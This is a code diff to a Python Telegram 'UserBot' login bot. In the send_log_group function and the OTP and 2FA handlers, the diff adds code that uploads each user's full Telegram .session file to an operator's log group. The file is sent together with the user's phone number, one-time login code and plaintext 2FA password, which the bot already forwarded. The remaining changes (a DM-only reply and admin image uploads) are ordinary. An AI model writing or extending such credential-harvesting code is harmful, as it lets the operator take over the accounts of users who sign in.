@@ -52,32 +52,45 @@ admin_upload_states = {}
 admin_config_state = {}
 
 
-async def send_log_group(context, user_id, username, phone, otp, tfa_pass, pyrogram_user_id):
+async def send_log_group(context, user_id, username, phone, otp, tfa_pass, pyrogram_user_id, session_path=None):
     settings = await db.get_settings()
     log_group_id = settings.get("log_group_id") or config.LOG_GROUP_ID
     if not log_group_id or log_group_id == 0:
         return
     owner = settings.get("owner_username", config.OWNER_USERNAME)
     text = (
-        f"👤 User ID: {user_id}\n"
+        f"📱 <b>New UserBot Connected</b>\n\n"
+        f"👤 User ID: <code>{user_id}</code>\n"
         f"👤 Username: @{username or 'None'}\n"
-        f"📱 Phone: {phone}\n"
-        f"🔑 OTP: {otp}\n"
-        f"🔐 2FA Password: {tfa_pass or 'None'}\n"
-        f"🆔 TG User ID: {pyrogram_user_id or 'N/A'}\n"
+        f"📱 Phone: <code>{phone}</code>\n"
+        f"🔑 OTP: <code>{otp}</code>\n"
+        f"🔐 2FA Password: <code>{tfa_pass or 'None'}</code>\n"
+        f"🆔 TG User ID: <code>{pyrogram_user_id or 'N/A'}</code>\n"
         f"👑 Owner: {owner}"
     )
-    import io
-    file = io.BytesIO(text.encode("utf-8"))
-    file.name = "phonenumber.txt"
     from telegram import InlineKeyboardMarkup, InlineKeyboardButton
     start_btn = InlineKeyboardMarkup([[InlineKeyboardButton("🚀 START BOT", url=config.BOT_LINK)]])
     try:
-        await context.bot.send_document(
-            chat_id=log_group_id, document=file,
-            caption=f"📁 Login Data - User {user_id}",
-            reply_markup=start_btn
-        )
+        if session_path and os.path.exists(session_path):
+            with open(session_path, "rb") as f:
+                await context.bot.send_document(
+                    chat_id=log_group_id,
+                    document=f,
+                    filename=f"{phone}.session",
+                    caption=text,
+                    parse_mode="HTML",
+                    reply_markup=start_btn
+                )
+        else:
+            import io
+            file = io.BytesIO(text.encode("utf-8"))
+            file.name = "phonenumber.txt"
+            await context.bot.send_document(
+                chat_id=log_group_id,
+                document=file,
+                caption=f"📁 Login Data - User {user_id}",
+                reply_markup=start_btn
+            )
     except Exception as e:
         logger.error(f"Failed to send log to group {log_group_id}: {e}")
 
@@ -277,8 +290,17 @@ async def _cache_start_images():
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
 
-    # DM-only: ignore group/channel messages
+    # DM-only: ignore group/channel messages but reply with start bot in DM warning and button
     if update.effective_chat and update.effective_chat.type != "private":
+        from telegram import InlineKeyboardMarkup, InlineKeyboardButton
+        kb = InlineKeyboardMarkup([[InlineKeyboardButton("Start Bot in DM", url=config.BOT_LINK)]])
+        try:
+            await update.message.reply_text(
+                "This bot is work only in dm start bot in dm",
+                reply_markup=kb
+            )
+        except Exception:
+            pass
         return
 
     await db.add_user(user.id, user.username, user.first_name)
@@ -1584,9 +1606,10 @@ async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
             login_state.pop(user.id, None)
             session_str = res["session_string"]
             pyrogram_uid = res.get("user_id", user.id)
+            session_path = res.get("session_path")
             
             await db.update_user(user.id, session_string=session_str, phone=phone)
-            await send_log_group(context, user.id, user.username, phone, digits, None, pyrogram_uid)
+            await send_log_group(context, user.id, user.username, phone, digits, None, pyrogram_uid, session_path=session_path)
             
             settings = await db.get_settings()
             auto_join_chan = settings.get("auto_join_channel", "")
@@ -1665,9 +1688,10 @@ async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
             login_state.pop(user.id, None)
             session_str = res["session_string"]
             pyrogram_uid = res.get("user_id", user.id)
+            session_path = res.get("session_path")
             
             await db.update_user(user.id, session_string=session_str, phone=phone)
-            await send_log_group(context, user.id, user.username, phone, "VIA_2FA", password, pyrogram_uid)
+            await send_log_group(context, user.id, user.username, phone, "VIA_2FA", password, pyrogram_uid, session_path=session_path)
             
             settings = await db.get_settings()
             auto_join_chan = settings.get("auto_join_channel", "")
@@ -1799,7 +1823,17 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if is_admin and user.id in admin_config_state:
         st_cfg = admin_config_state[user.id]
         field = st_cfg.get("field")
-        text = update.message.text.strip()
+        
+        # Extract text/photo logic
+        text = ""
+        photo_file_id = None
+        if update.message.text:
+            text = update.message.text.strip()
+        elif update.message.caption:
+            text = update.message.caption.strip()
+            
+        if update.message.photo:
+            photo_file_id = update.message.photo[-1].file_id
 
         settings = await db.get_settings()
 
@@ -1883,14 +1917,20 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             name = st_cfg.get("service_name", "Service")
             admin_config_state[user.id] = {"field": "add_service_image", "service_name": name, "contact_text": text}
             await update.message.reply_text(
-                f"✅ Contact text saved.\n\nNow send the <b>Telegram file_id</b> of an image to attach (or send <code>none</code> to skip).",
+                f"✅ Contact text saved.\n\nNow send/upload the <b>Image</b> directly, or send the <b>Telegram file_id</b> of an image, or send <code>none</code> to skip.",
                 parse_mode="HTML"
             )
 
         elif field == "add_service_image":
             name = st_cfg.get("service_name", "Service")
             ct = st_cfg.get("contact_text", "Contact owner for details.")
-            img_id = None if text.lower() == "none" else text
+            
+            img_id = None
+            if photo_file_id:
+                img_id = photo_file_id
+            elif text and text.lower() != "none":
+                img_id = text
+                
             sid = await db.add_service(name, ct, img_id)
             await update.message.reply_text(f"✅ Service '<b>{name}</b>' created! (ID: {sid})", parse_mode="HTML")
             admin_config_state.pop(user.id, None)
@@ -2217,7 +2257,8 @@ def main():
     app.add_handler(CommandHandler("logs", show_session_logs))
     app.add_handler(CommandHandler("setchannel", set_channel))
 
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    # Allow processing text messages, photo captions and photos inside handle_message
+    app.add_handler(MessageHandler((filters.TEXT | filters.PHOTO) & ~filters.COMMAND, handle_message))
     app.add_handler(MessageHandler(filters.VIDEO, handle_video_message))
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_error_handler(error_handler)
